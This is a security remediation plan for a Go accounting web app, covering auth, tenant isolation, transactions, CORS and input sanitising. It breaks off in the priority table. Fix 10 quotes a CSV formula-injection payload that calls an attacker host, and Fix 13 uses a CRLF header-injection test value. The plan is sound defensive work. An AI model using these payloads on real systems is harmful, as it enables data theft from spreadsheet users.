# Security & Correctness Fix Implementation Plan

Sources:
- `docs/issues/ISSUES.md` — seven issues validated against codebase on 2026-03-01 (Fixes 1–8).
- Extended codebase review 2026-03-01 — five additional issues (Fixes 9–13).

Each fix is self-contained and ordered so that lower-numbered items can be done independently.

---

## Fix 1 — Fail-fast on missing JWT_SECRET (Critical / 5 minutes)

**File:** `cmd/server/main.go:46–50`

**Problem:** When `JWT_SECRET` is absent the server logs a warning and continues with the
published string `"insecure-default-change-me"`. Any attacker can forge valid session tokens.

**Change:**

```go
// before
jwtSecret := os.Getenv("JWT_SECRET")
if jwtSecret == "" {
    log.Println("Warning: JWT_SECRET is not set; using insecure default — set JWT_SECRET in .env")
    jwtSecret = "insecure-default-change-me"
}

// after
jwtSecret := os.Getenv("JWT_SECRET")
if jwtSecret == "" {
    log.Fatalf("JWT_SECRET is not set — refusing to start. Set a strong random value in .env")
}
```

**Test:** Start server without `JWT_SECRET`; verify exit code ≠ 0 and a clear log message.

---

## Fix 2 — Add Secure flag to auth cookies (High / 10 minutes)

**Files:** `internal/adapters/web/auth.go:129` and `internal/adapters/web/pages.go:67`

**Problem:** Both cookie-setting paths omit `Secure: true`, allowing the token to travel
over plain HTTP when TLS terminates upstream. `SameSite: http.SameSiteStrictMode` is
already set correctly and does not need changing.

**Change (apply identically in both files):**

```go
http.SetCookie(w, &http.Cookie{
    Name:     "auth_token",
    Value:    signed,
    Path:     "/",
    HttpOnly: true,
    Secure:   true,                    // ← add this line
    SameSite: http.SameSiteStrictMode,
    MaxAge:   3600,
})
```

Apply the same one-line addition to the logout cookie-clearing calls in both files so the
`Secure` attribute is consistent (browsers require it on the clear cookie when the original
was set with `Secure`).

**Test:** Inspect `Set-Cookie` response header after login; confirm `Secure` attribute is
present.

---

## Fix 3 — Derive company code from auth claims in buildAppLayoutData (High / 20 minutes)

**File:** `internal/adapters/web/pages.go:103–132`

**Problem:** `buildAppLayoutData` calls `LoadDefaultCompany`, which errors in any
multi-company database not configured with `COMPANY_CODE` env var. This leaves
`CompanyCode = ""` in the layout data, which propagates into the chat page and causes every
chat POST to be rejected before the SSE stream opens.

`buildAppLayoutData` already calls `GetUser(ctx, claims.UserID)` and has the `user` struct
available. `user.CompanyCode` is exactly the field that is needed.

**Change — replace the `LoadDefaultCompany` block with a user-derived lookup:**

```go
func (h *Handler) buildAppLayoutData(r *http.Request, title, activeNav string) layouts.AppLayoutData {
    claims := authFromContext(r.Context())
    username := ""
    role := ""
    companyCode := ""

    if claims != nil {
        user, err := h.svc.GetUser(r.Context(), claims.UserID)
        if err == nil {
            username = user.Username
            role = user.Role
            companyCode = user.CompanyCode   // ← was missing; derive from the authenticated user
        }
    }

    // Company name: use a new GetCompanyByCode(ctx, companyCode) helper when available.
    // DO NOT call LoadDefaultCompany here — it fails when multiple companies exist.
    // Until the helper is added, fall back to the code itself as the display name.
    companyName := "Accounting"
    if companyCode != "" {
        companyName = companyCode  // placeholder until GetCompanyByCode helper is wired
    }

    return layouts.AppLayoutData{
        Title:       title,
        CompanyName: companyName,
        CompanyCode: companyCode,
        FYBadge:     "FY 2025-26",
        Username:    username,
        Role:        role,
        ActiveNav:   activeNav,
    }
}
```

**Note on company name:** `LoadDefaultCompany` fails when multiple companies exist and must
**not** be called here. Add a `GetCompanyByCode(ctx, companyCode string) (*CompanyResult, error)`
method to `ApplicationService` (or inline a direct `SELECT name FROM companies WHERE company_code = $1`),
and replace the placeholder above with that call. The critical invariant is that `companyCode`
must never depend on `LoadDefaultCompany` succeeding.

**Test:** Log in with a database that has multiple companies (no `COMPANY_CODE` env var).
Verify chat page sends a non-empty `company_code`.

---

## Fix 4 — Surface HTTP errors in the chat UI (Medium / 20 minutes)

**File:** `web/templates/pages/chat_home.templ` — `sendMessage` function (~line 252)

**Problem:** After `fetch('/chat', ...)` the code jumps straight to `resp.body.getReader()`
without checking `resp.ok`. A pre-stream HTTP 4xx response (e.g., 400 from missing
`company_code`) is read as raw text by the SSE parser; no `event:` line matches, the loop
exhausts the body silently, and the user sees nothing.

**Change — add `resp.ok` guard immediately after the fetch:**

```javascript
const resp = await fetch('/chat', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ text, company_code: COMPANY_CODE, attachment_ids: attachmentIDs }),
});

// ← add this block
if (!resp.ok) {
    let errMsg = `Server error (${resp.status})`;
    try {
        const errBody = await resp.json();
        errMsg = errBody.message || errBody.error || errMsg;
    } catch (_) {}
    this.messages.push({ role: 'ai', type: 'text', text: '⚠ ' + errMsg });
    this.saveHistory();
    this.$nextTick(() => this.scrollToBottom());
    return;
}

const reader = resp.body.getReader();
// ... rest of SSE streaming unchanged
```

**Test:** Temporarily send a request with `company_code: ""` (or force a 400 from the
server); verify the error message appears in the chat thread.

---

## Fix 5 — Enforce company ownership in web handlers (High / 45 minutes)

**Files:** `internal/adapters/web/handlers.go`, `internal/adapters/web/chat.go`,
`internal/adapters/web/orders.go`, `internal/adapters/web/vendors.go`

**Problem:** `companyCode(r)` extracts the `{code}` URL path parameter and `chatMessage`
reads `req.CompanyCode` from the POST body. Neither is compared against
`authFromContext(r.Context()).CompanyID`. A user authenticated for company A can operate
on company B's data by supplying a different code.

### Step 5a — Add a company-guard helper to Handler

Add the following helper in `internal/adapters/web/handlers.go`:

```go
// requireCompanyAccess verifies that the authenticated user belongs to the company
// identified by requestedCode. Returns false and writes a 403 response if not.
// Must only be called after RequireAuth or RequireAuthBrowser middleware.
func (h *Handler) requireCompanyAccess(w http.ResponseWriter, r *http.Request, requestedCode string) bool {
    claims := authFromContext(r.Context())
    if claims == nil {
        writeError(w, r, "authentication required", "UNAUTHORIZED", http.StatusUnauthorized)
        return false
    }
    // Resolve the requesting user's actual company code.
    user, err := h.svc.GetUser(r.Context(), claims.UserID)
    if err != nil || user.CompanyCode != requestedCode {
        writeError(w, r, "access denied: company mismatch", "FORBIDDEN", http.StatusForbidden)
        return false
    }
    return true
}
```

**Performance note:** `GetUser` hits the database. If this becomes a bottleneck, the user's
`CompanyCode` can be embedded in the JWT at login time (stored in `jwtClaims`) to avoid the
extra query. For MVP, the DB lookup is acceptable.

### Step 5b — Apply the guard to all API handlers that take `{code}`

In `internal/adapters/web/orders.go` and `internal/adapters/web/vendors.go`, add the guard
as the first action in every handler that calls `companyCode(r)`:

```go
func (h *Handler) apiConfirmOrder(w http.ResponseWriter, r *http.Request) {
    code := companyCode(r)
    if !h.requireCompanyAccess(w, r, code) {  // ← add
        return
    }
    ref := chi.URLParam(r, "ref")
    // ... rest unchanged
}
```

Handlers requiring the guard (full list):

| File | Handlers |
|---|---|
| `orders.go` | `apiListCustomers`, `apiListProducts`, `apiListOrders`, `apiGetOrder`, `apiCreateOrder`, `apiConfirmOrder`, `apiShipOrder`, `apiInvoiceOrder`, `apiPaymentOrder` |
| `vendors.go` | `apiListVendors`, `apiCreateVendor`, `apiGetVendor`, `apiListPurchaseOrders`, `apiCreatePurchaseOrder`, `apiGetPurchaseOrder`, `apiApprovePO`, `apiReceivePO`, `apiInvoicePO`, `apiPayPO` |
| `accounting.go` | All handlers that accept a `{code}` param (trial balance, statement, P&L, balance sheet, journal entry) |

### Step 5c — Guard the chat handler against cross-company POST body

In `internal/adapters/web/chat.go:chatMessage`, after validating non-empty fields:

```go
if req.Text == "" || req.CompanyCode == "" {
    writeError(w, r, "text and company_code are required", "BAD_REQUEST", http.StatusBadRequest)
    return
}
// ← add
if !h.requireCompanyAccess(w, r, req.CompanyCode) {
    return
}
```

Apply the same guard to `chatConfirm` — the `pendingAction` already stores
`CompanyCode`; verify the confirmed token's `CompanyCode` matches the authenticated user's
company before executing.

**Test:** Authenticate as a user from company 1000. Issue a request to
`/api/companies/2000/orders`; confirm HTTP 403. Issue the same request to
`/api/companies/1000/orders`; confirm HTTP 200.

---

## Fix 6 — Enforce company ownership in PO domain service methods (High / 60 minutes)

**Files:** `internal/core/purchase_order_service.go`,
`internal/app/app_service.go`

**Problem:** `ApprovePO`, `ReceivePO`, `RecordVendorInvoice`, and `PayVendor` accept a PO ID
but never explicitly verify the PO belongs to the caller's company at the domain layer. Any
authenticated user who learns another company's numeric PO ID can approve, receive, invoice,
or pay it. (`ReceivePO` has incidental partial protection at the app layer — the AP account
lookup in `ReceivePurchaseOrder` uses `WHERE po.id = $1 AND po.company_id = $2` — but the
domain method itself has no ownership check, making it fragile if called from other paths.)

### Step 6a — Add `companyID int` to `ApprovePO`

**`purchase_order_service.go:ApprovePO` signature change:**

```go
// before
func (s *purchaseOrderService) ApprovePO(ctx context.Context, poID int, docService DocumentService) error

// after
func (s *purchaseOrderService) ApprovePO(ctx context.Context, companyID, poID int, docService DocumentService) error
```

**Add company ownership check inside `ApprovePO` (right after the FOR UPDATE query):**

```go
// existing: reads companyID and status from the PO row
if err := tx.QueryRow(ctx,
    "SELECT company_id, status FROM purchase_orders WHERE id = $1 FOR UPDATE",
    poID,
).Scan(&poCompanyID, &status); err != nil { ... }

// ← add ownership check
if poCompanyID != companyID {
    return fmt.Errorf("purchase order %d does not belong to company %d", poID, companyID)
}
```

**Update `PurchaseOrderService` interface** in `internal/core/` to match.

**Update `appService.ApprovePurchaseOrder`** to resolve the company ID and forward it:

```go
func (s *appService) ApprovePurchaseOrder(ctx context.Context, companyCode string, poID int) (*PurchaseOrderResult, error) {
    company, err := s.fetchCompany(ctx, companyCode)  // already exists
    if err != nil {
        return nil, err
    }
    if err := s.purchaseOrderService.ApprovePO(ctx, company.ID, poID, s.docService); err != nil {
        return nil, err
    }
    // ... GetPO and return unchanged
}
```

### Step 6b — Add `companyID int` to `RecordVendorInvoice`

**`purchase_order_service.go:RecordVendorInvoice` signature change:**

```go
// before
func (s *purchaseOrderService) RecordVendorInvoice(ctx context.Context, poID int, ...) (string, error)

// after
func (s *purchaseOrderService) RecordVendorInvoice(ctx context.Context, companyID, poID int, ...) (string, error)
```

**Add ownership check inside `RecordVendorInvoice`** (the existing FOR UPDATE query already
reads `company_id`; extend the check after scanning):

```go
if err := tx.QueryRow(ctx,
    "SELECT company_id, status, total_base FROM purchase_orders WHERE id = $1 FOR UPDATE",
    poID,
).Scan(&poCompanyID, &status, &totalBase); err != nil { ... }

// ← add
if poCompanyID != companyID {
    return "", fmt.Errorf("purchase order %d does not belong to company %d", poID, companyID)
}
```

**Update `appService.RecordVendorInvoice`** to resolve and forward company ID:

```go
func (s *appService) RecordVendorInvoice(ctx context.Context, req VendorInvoiceRequest) (*VendorInvoiceResult, error) {
    company, err := s.fetchCompany(ctx, req.CompanyCode)
    if err != nil {
        return nil, err
    }
    warning, err := s.purchaseOrderService.RecordVendorInvoice(
        ctx, company.ID, req.POID, req.InvoiceNumber, req.InvoiceDate, req.InvoiceAmount, s.docService,
    )
    // ... rest unchanged
}
```

### Step 6c — Add ownership check to `PayVendor`

**`purchase_order_service.go:PayVendor`** already receives `companyCode string`. The
existing FOR UPDATE query fetches `po.company_id`; add a lookup to compare:

```go
// existing scan (already has companyID):
).Scan(&companyID, &status, &invoiceAmount, &totalBase, &apAccountCode)

// ← add: resolve companyCode to an ID and verify
var expectedCompanyID int
if err := tx.QueryRow(ctx,
    "SELECT id FROM companies WHERE company_code = $1", companyCode,
).Scan(&expectedCompanyID); err != nil {
    return fmt.Errorf("resolve company %s: %w", companyCode, err)
}
if companyID != expectedCompanyID {
    return fmt.Errorf("purchase order %d does not belong to company %s", poID, companyCode)
}
```

Alternatively, change `PayVendor`'s signature to accept `companyID int` (consistent with the
other fixes) and resolve the ID in `appService.PayVendor` before calling the domain method.

### Step 6d — Add company filter to `GetPO`

`GetPO` is called from `appService` after mutating operations for the "read back" result.
It should not be a cross-company escape hatch. Add an optional company guard:

Option A (minimal): add a `GetPOForCompany(ctx, companyID, poID int)` variant that includes
`AND po.company_id = $2` in the WHERE clause, and use it in `appService` instead of `GetPO`.

Option B: add `companyID` to `GetPO` and update all callers. This is safer but touches more
code.

**Recommended: Option A** — keeps existing callers (integration tests) working without
change, and adds the guard exactly where it matters.

### Step 6e — Add company ownership check to `ReceivePO`

`ReceivePO` currently accepts `companyCode string` and uses it only for downstream
`ReceiveStock` calls — it does not verify the PO being received belongs to that company.

**Change the opening SELECT inside `ReceivePO`** (which currently reads status and vendor
from `purchase_orders WHERE id = $1`) to also assert company membership:

```go
// before
err := s.pool.QueryRow(ctx,
    `SELECT status, vendor_id FROM purchase_orders WHERE id = $1`,
    poID,
).Scan(&status, &vendorID)

// after — join on companies to enforce ownership
err := s.pool.QueryRow(ctx,
    `SELECT po.status, po.vendor_id
     FROM purchase_orders po
     JOIN companies c ON c.id = po.company_id
     WHERE po.id = $1 AND c.company_code = $2`,
    poID, companyCode,
).Scan(&status, &vendorID)
```

If the PO does not exist for that company, `pgx` returns `pgx.ErrNoRows` — return a
clear "purchase order not found" error (do not distinguish between "does not exist" and
"wrong company" to avoid enumeration).

**Test:** Authenticate as company 1000. Call `ReceivePO` with a PO ID belonging to company
2000. Confirm the operation returns an error and no inventory movement is created.

**Test:** Authenticate as company 1000. Call `ApprovePO` with a PO ID belonging to company
2000. Confirm the operation returns an error and the PO status is unchanged.

---

## Fix 7 — Atomise inventory write and ledger commit (High / 45 minutes)

**File:** `internal/core/inventory_service.go:ReceiveStock` (lines ~155–304)

**Problem:** The inventory transaction commits at line 278, then `ledger.Commit` runs in a
separate transaction at line 300. A failure between the two leaves stock updated but no
journal entry posted.

### Approach

Replace the two-transaction pattern with a single transaction using `Ledger.CommitInTx`.
`Ledger.CommitInTx` already exists and is used by `PayVendor` and the COGS booking in
`ShipStockTx`.

**Structural change to `ReceiveStock`:**

1. Begin one transaction `tx`.
2. Perform all existing inventory writes (upsert `inventory_items`, insert
   `inventory_movements`) inside `tx` — unchanged.
3. Build the `Proposal` struct — unchanged.
4. Call `ledger.CommitInTx(ctx, tx, proposal)` **before** `tx.Commit`.
5. Call `tx.Commit(ctx)` once at the end — both inventory and journal entry commit together
   or not at all.
6. Remove the standalone `ledger.Commit(ctx, proposal)` call that currently follows the
   `tx.Commit`.

**Sketch of the changed tail of `ReceiveStock`:**

```go
// (after all inventory_items and inventory_movements writes, still inside tx)

totalCost := qty.Mul(unitCost)
proposal := Proposal{
    DocumentTypeCode:    "GR",
    CompanyCode:         companyCode,
    IdempotencyKey:      fmt.Sprintf("goods-receipt-%s-%s-%s", companyCode, productCode, movementDate),
    TransactionCurrency: baseCurrency,
    ExchangeRate:        "1",
    Summary:             fmt.Sprintf("Goods Receipt: %s units of %s @ %s", qty, productCode, unitCost),
    PostingDate:         movementDate,
    DocumentDate:        movementDate,
    Confidence:          1.0,
    Reasoning:           fmt.Sprintf("Inventory receipt for product %s, %s units at %s.", productCode, qty, unitCost),
    Lines: []ProposalLine{
        {AccountCode: inventoryAccount, IsDebit: true, Amount: totalCost.String()},
        {AccountCode: creditAccountCode, IsDebit: false, Amount: totalCost.String()},
    },
}

// Commit ledger entry inside the same tx — atomic with inventory write
if err := ledger.CommitInTx(ctx, tx, proposal); err != nil {
    return fmt.Errorf("failed to book goods receipt journal entry: %w", err)
}

// Single commit: both inventory + journal entry land together
if err := tx.Commit(ctx); err != nil {
    return fmt.Errorf("failed to commit goods receipt: %w", err)
}

return nil
```

**Note on `baseCurrency`:** `baseCurrency` is currently resolved inside the tx (line ~175).
It is already available before the `tx.Commit` call, so the proposal construction requires
no reordering.

**Note on `IdempotencyKey`:** The current code sets this to `""` (empty string). Supplying
a meaningful key (`companyCode + productCode + movementDate`) makes the ledger idempotency
guard useful and prevents double-booking on retry.

**Impact on callers:** `ReceiveStock` signature is unchanged. `ReceivePO` in
`purchase_order_service.go` calls `ReceiveStock` and is unaffected.

**Test:** In an integration test, mock or intercept the ledger write to fail after the
inventory items are updated (e.g., by inserting a duplicate idempotency key first). Verify
that `qty_on_hand` is NOT updated (the transaction rolled back). Currently this test would
fail (demonstrating the bug); after the fix it should pass.

---

## Fix 8 — Enforce received quantity ≤ ordered quantity (Medium / 30 minutes)

**File:** `internal/core/purchase_order_service.go:ReceivePO` (lines ~252–306)

**Problem:** `rl.QtyReceived` is checked to be positive but never compared against the PO
line's ordered quantity. A single call can over-receive any line indefinitely.

### Change — add a cumulative quantity check for goods lines

For each received goods line, query how much has already been received against that PO line,
add the current `rl.QtyReceived`, and reject if the total exceeds `pol.Quantity`:

```go
if pol.ProductID != nil {
    // ← add: check cumulative received quantity does not exceed ordered
    var alreadyReceived decimal.Decimal
    if err := s.pool.QueryRow(ctx, `
        SELECT COALESCE(SUM(im.quantity), 0)
        FROM inventory_movements im
        WHERE im.po_line_id = $1 AND im.movement_type = 'RECEIPT'`,
        pol.ID,
    ).Scan(&alreadyReceived); err != nil {
        return fmt.Errorf("check received quantity for PO line %d: %w", pol.ID, err)
    }
    totalAfterReceipt := alreadyReceived.Add(rl.QtyReceived)
    if totalAfterReceipt.GreaterThan(pol.Quantity) {
        return fmt.Errorf(
            "PO line %d: would receive %s but only %s ordered (already received %s)",
            pol.ID, totalAfterReceipt.StringFixed(4), pol.Quantity.StringFixed(4),
            alreadyReceived.StringFixed(4),
        )
    }

    // existing ReceiveStock call unchanged
    if err := inv.ReceiveStock(ctx, companyCode, warehouseCode, productCode, ...); err != nil {
        return ...
    }
}
```

For service/expense lines, the equivalent check is against the invoiced amount; this is
lower priority and can be addressed in a follow-on.

**TOCTOU race warning:** The `SUM(im.quantity)` query above runs on the pool (outside any
transaction). Two concurrent `ReceivePO` calls for the same PO line could both pass the
check before either inserts its `inventory_movements` row, allowing a combined over-receipt.
To eliminate the race, move the check inside `ReceiveStock`'s existing transaction and add a
`SELECT qty_on_hand FROM inventory_items WHERE ... FOR UPDATE` row lock before the check, or
add a `SELECT ... FOR UPDATE` on the `purchase_order_lines` row at the start of `ReceivePO`.
This level of concurrency control is acceptable to defer for MVP, but must be addressed
before the receive endpoint is exposed under high load.

**Test:** Create an approved PO with quantity 10. Call `ReceivePO` with `QtyReceived = 11`.
Confirm error is returned and no inventory movement is created.

---

## Phase 2 — Additional Findings (Extended Review 2026-03-01)

---

## Fix 9 — CORS: stop reflecting credentials to unconfigured origins (High / 15 minutes)

**File:** `internal/adapters/web/middleware.go:61–78`

**Problem:** The CORS middleware treats "no `ALLOWED_ORIGINS` configured" as "allow every
origin":

```go
// current — len(origins) == 0 when ALLOWED_ORIGINS env var is absent
if origin != "" && (len(origins) == 0 || contains(origins, origin) || contains(origins, "*")) {
    w.Header().Set("Access-Control-Allow-Origin", origin)   // echoes arbitrary origin
    w.Header().Set("Access-Control-Allow-Credentials", "true")
```

When `ALLOWED_ORIGINS` is not set — the default for a fresh deployment — any website can
make credentialled cross-origin requests with the session cookie. This bypasses browser
same-origin protections because the actual request `Origin` is reflected (not `*`), so
browsers will forward the cookie.

**Change — invert the default: emit CORS headers only when an explicit list is provided
and the request origin is in it:**

```go
func CORS(allowedOrigins string) func(http.Handler) http.Handler {
    origins := splitAndTrim(allowedOrigins)
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            origin := r.Header.Get("Origin")
            // Only emit CORS headers when the caller has explicitly configured origins
            // and the request origin is in the list. An empty list means CORS-disabled.
            if origin != "" && len(origins) > 0 && contains(origins, origin) {
                w.Header().Set("Access-Control-Allow-Origin", origin)
                w.Header().Set("Access-Control-Allow-Credentials", "true")
                w.Header().Set("Access-Control-Allow-Headers", "Content-Type, X-CSRF-Token, X-Request-ID")
                w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, PATCH, DELETE, OPTIONS")
            }
            if r.Method == http.MethodOptions {
                w.WriteHeader(http.StatusNoContent)
                return
            }
            next.ServeHTTP(w, r)
        })
    }
}
```

**Note:** Wildcard (`*`) support is intentionally removed. If a future consumer genuinely
needs it, add an explicit `CORS_ALLOW_ALL=true` env flag that also suppresses
`Access-Control-Allow-Credentials` (browsers reject `*` + credentials anyway).

**Test:** Start server with no `ALLOWED_ORIGINS`. Issue a request with `Origin: https://evil.example.com`.
Confirm no `Access-Control-Allow-*` headers appear in the response.

---

## Fix 10 — Sanitise CSV export against formula injection (Medium / 15 minutes)

**File:** `internal/adapters/web/accounting.go:143–152`

**Problem:** The account statement CSV export writes `line.Narration` and `line.Reference`
directly to cells without escaping:

```go
cw.Write([]string{
    line.PostingDate,
    line.Narration,   // AI-generated or user-supplied — can start with = + - @
    line.Reference,
    ...
})
```

Any narration that begins with `=`, `+`, `-`, `@`, or `\t` is executed as a spreadsheet
formula when the CSV is opened in Excel or LibreOffice Calc. Because narrations originate
partly from AI-generated `Summary` fields and partly from human-written journal entry
descriptions, an attacker with chat access can craft a narration such as
`=HYPERLINK("http://attacker.com","click")` that exfiltrates data when the accountant
opens the export.

**Change — add a `csvSafe` helper and apply it to every user-influenced cell:**

```go
// csvSafe prevents CSV formula injection by prefixing cells that begin with a
// formula-triggering character with a single quote. The quote is visible in the
// raw CSV but stripped by most spreadsheet applications on import.
func csvSafe(s string) string {
    if len(s) == 0 {
        return s
    }
    switch s[0] {
    case '=', '+', '-', '@', '\t', '\r':
        return "'" + s
    }
    return s
}
```

Apply to every non-numeric field in the CSV write:

```go
cw.Write([]string{
    line.PostingDate,
    csvSafe(line.Narration),   // ← wrap
    csvSafe(line.Reference),   // ← wrap
    line.Debit.StringFixed(2),
    line.Credit.StringFixed(2),
    line.RunningBalance.StringFixed(2),
})
```

**Test:** Create a journal entry with `Summary` = `=SUM(1,2)`. Export the account
statement CSV. Open in a text editor and confirm the narration cell reads `'=SUM(1,2)`.

---

## Fix 11 — Report page handlers: derive company from user session (Medium / 30 minutes)

**File:** `internal/adapters/web/accounting.go`

**Problem:** Five browser-page handlers call `LoadDefaultCompany` directly instead of using
the authenticated user's company code from the JWT:

| Handler | Line | Effect in multi-company DB |
|---------|------|-----------------------------|
| `trialBalancePage` | 25 | HTTP 500 or wrong company's trial balance |
| `plReportPage` | 65 | HTTP 500 or wrong company's P&L |
| `balanceSheetPage` | ~85 | HTTP 500 or wrong company's balance sheet |
| `accountStatementPage` | 124 | HTTP 500 or wrong company's statement |
| `journalEntryPage` | 166 | HTTP 500, `CompanyCode` passed to template is wrong |

This is the same root cause as the chat page issue (Fix 3). After Fix 3 is applied,
`buildAppLayoutData` will carry the correct `CompanyCode` in `AppLayoutData.CompanyCode`.
Each of these handlers should derive its `companyCode` from that field rather than making
a second, independent `LoadDefaultCompany` call.

**Change — replace each `LoadDefaultCompany` block with a read from the layout data:**

Pattern (apply to all five handlers):

```go
// before
func (h *Handler) trialBalancePage(w http.ResponseWriter, r *http.Request) {
    d := h.buildAppLayoutData(r, "Trial Balance", "trial-balance")

    company, err := h.svc.LoadDefaultCompany(r.Context())
    if err != nil {
        http.Error(w, "Failed to load company", http.StatusInternalServerError)
        return
    }

    result, err := h.svc.GetTrialBalance(r.Context(), company.CompanyCode)
    ...
}

// after
func (h *Handler) trialBalancePage(w http.ResponseWriter, r *http.Request) {
    d := h.buildAppLayoutData(r, "Trial Balance", "trial-balance")

    // CompanyCode is already resolved from the auth session by buildAppLayoutData (Fix 3).
    if d.CompanyCode == "" {
        http.Error(w, "Company not resolved — please log in again", http.StatusUnauthorized)
        return
    }

    result, err := h.svc.GetTrialBalance(r.Context(), d.CompanyCode)
    ...
}
```

Apply the same replacement to `plReportPage`, `balanceSheetPage`,
`accountStatementPage` (both the HTML and the CSV branch), and `journalEntryPage`.

**Dependency:** Fix 3 must land first; otherwise `d.CompanyCode` will still be blank.

**Note on `accountStatementPage`:** the CSV export branch also calls `LoadDefaultCompany`
independently at line 124. Both the HTML path and the CSV path must use `d.CompanyCode`.

**Test:** Log in as a user belonging to company 1000 with a database that also has company
2000. Navigate to `/reports/trial-balance`. Confirm the report shows company 1000 data, not
company 2000 data, and no HTTP 500 occurs.

---

## Fix 12 — Atomise InvoiceOrder and RecordPayment (High / 60 minutes)

**File:** `internal/core/order_service.go`

**Problem:** Both `InvoiceOrder` (lines 411–498) and `RecordPayment` (lines 500–558) commit
the ledger entry in one transaction then update the order status in a separate database
call. This is the same split-brain pattern as `ReceiveStock` (Fix 7).

```
InvoiceOrder:   ledger.Commit(ctx, proposal)                     ← own tx, line 473
                pool.Exec("UPDATE sales_orders … INVOICED …")    ← separate call, line 488

RecordPayment:  ledger.Commit(ctx, proposal)                     ← own tx, line 545
                pool.Exec("UPDATE sales_orders … PAID …")        ← separate call, line 549
```

If the status `UPDATE` fails after the ledger commit, the journal entry is permanently on
the books (idempotency key prevents re-posting) but the order's status is stuck. The system
is consistent on retry only if the caller retries — there is no automatic rollback.

### Step 12a — Change ledger parameter type from interface to concrete `*Ledger`

`InvoiceOrder` and `RecordPayment` currently accept `ledger LedgerService` (interface),
which only exposes `Commit`. `CommitInTx` is defined on `*Ledger` (the concrete type).
`ShipOrder` already takes `ledger *Ledger` and is the correct template.

```go
// OrderService interface — before
InvoiceOrder(ctx context.Context, orderID int, ledger LedgerService, docService DocumentService) (*SalesOrder, error)
RecordPayment(ctx context.Context, orderID int, bankAccountCode string, paymentDate string, ledger LedgerService) error

// OrderService interface — after
InvoiceOrder(ctx context.Context, orderID int, ledger *Ledger, docService DocumentService) (*SalesOrder, error)
RecordPayment(ctx context.Context, orderID int, bankAccountCode string, paymentDate string, ledger *Ledger) error
```

Update the `OrderService` interface in `order_service.go` and both callers in
`internal/app/app_service.go` (`InvoiceOrder` line 200, `RecordPayment` line 213) to pass
the concrete `s.ledger`.

### Step 12b — Wrap InvoiceOrder in a single transaction

```go
func (s *orderService) InvoiceOrder(ctx context.Context, orderID int, ledger *Ledger, docService DocumentService) (*SalesOrder, error) {
    order, err := s.GetOrder(ctx, orderID)  // read-only pre-check, unchanged
    if err != nil {
        return nil, err
    }
    if order.Status != "SHIPPED" {
        return nil, fmt.Errorf("order %s cannot be invoiced: status is %s", order.OrderNumber, order.Status)
    }

    // ... build companyCode, arAccount, proposalLines — unchanged ...

    tx, err := s.pool.Begin(ctx)
    if err != nil {
        return nil, fmt.Errorf("begin invoice tx: %w", err)
    }
    defer tx.Rollback(ctx)

    // Ledger entry and order status update commit atomically.
    if err := ledger.CommitInTx(ctx, tx, proposal); err != nil {
        return nil, fmt.Errorf("commit invoice journal entry for order %s: %w", order.OrderNumber, err)
    }

    // Fetch the SI document number inside the same tx.
    var invoiceDocID *int
    _ = tx.QueryRow(ctx, `
        SELECT d.id
        FROM documents d
        JOIN journal_entries je ON je.reference_id = d.document_number AND je.reference_type = 'DOCUMENT'
        WHERE je.idempotency_key = $1 LIMIT 1`,
        fmt.Sprintf("invoice-order-%d", orderID),
    ).Scan(&invoiceDocID)

    if _, err = tx.Exec(ctx, `
        UPDATE sales_orders
        SET status = 'INVOICED', invoiced_at = NOW(), invoice_document_id = $1
        WHERE id = $2`,
        invoiceDocID, orderID,
    ); err != nil {
        return nil, fmt.Errorf("mark order %d as INVOICED: %w", orderID, err)
    }

    if err := tx.Commit(ctx); err != nil {
        return nil, fmt.Errorf("commit invoice tx: %w", err)
    }

    return s.GetOrder(ctx, orderID)
}
```

### Step 12c — Wrap RecordPayment in a single transaction

```go
func (s *orderService) RecordPayment(ctx context.Context, orderID int, bankAccountCode string, paymentDate string, ledger *Ledger) error {
    // ... build proposal — unchanged ...

    tx, err := s.pool.Begin(ctx)
    if err != nil {
        return fmt.Errorf("begin payment tx: %w", err)
    }
    defer tx.Rollback(ctx)

    if err := ledger.CommitInTx(ctx, tx, proposal); err != nil {
        return fmt.Errorf("commit payment journal entry for order %s: %w", order.OrderNumber, err)
    }

    if _, err = tx.Exec(ctx,
        "UPDATE sales_orders SET status = 'PAID', paid_at = NOW() WHERE id = $1",
        orderID,
    ); err != nil {
        return fmt.Errorf("mark order %d as PAID: %w", orderID, err)
    }

    return tx.Commit(ctx)
}
```

**Impact:** The `OrderService` interface changes. The two integration test helpers that call
`InvoiceOrder` and `RecordPayment` must pass `*Ledger` instead of the interface. All other
callers go through `appService`, which already holds `s.ledger *Ledger`.

**Test:** Simulate a failure of the `UPDATE sales_orders` step (e.g., rename the column in
the test DB temporarily, or add a DB-level trigger). Confirm the ledger entry is also
absent after the failure. Add an integration test to `order_integration_test.go` that
verifies the order status advances atomically.

---

## Fix 13 — Validate X-Request-ID header before accepting (Low / 10 minutes)

**File:** `internal/adapters/web/middleware.go:26–28`

**Problem:** The `RequestID` middleware accepts the `X-Request-ID` header from the client
verbatim and echoes it in the response:

```go
id := r.Header.Get("X-Request-ID")
if id == "" {
    id = uuid.NewString()
}
w.Header().Set("X-Request-ID", id)
```

A caller can supply any arbitrary string. Go's `net/http` strips bare newlines from header
values (since Go 1.15), preventing the most dangerous CRLF injection. However, the value is
stored in the request context and may be propagated to log lines, upstream proxies, or
tracing systems that do not apply the same sanitisation. Accepting a UUID-shaped string only
closes the risk entirely and adds no meaningful restriction for legitimate callers.

**Change:**

```go
import "regexp"

var validRequestID = regexp.MustCompile(`^[a-zA-Z0-9\-]{1,64}$`)

func RequestID(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        id := r.Header.Get("X-Request-ID")
        // Accept caller-supplied IDs only if they are safe alphanumeric/hyphen strings.
        // Generate a fresh UUID for anything else (absent, too long, unusual characters).
        if !validRequestID.MatchString(id) {
            id = uuid.NewString()
        }
        w.Header().Set("X-Request-ID", id)
        ctx := context.WithValue(r.Context(), requestIDKey, id)
        next.ServeHTTP(w, r.WithContext(ctx))
    })
}
```

**Test:** Send a request with `X-Request-ID: ../../../etc\r\nX-Injected: hdr`. Confirm the
response `X-Request-ID` is a server-generated UUID, not the injected string.

---

## Implementation Order

| Priority | Fix | Effort | Risk |
|----------|-----|--------|------|
| **Phase 1 — Original Findings** | | | |
| 1 | Fix 1 — JWT fail-fast | 5 min | None |
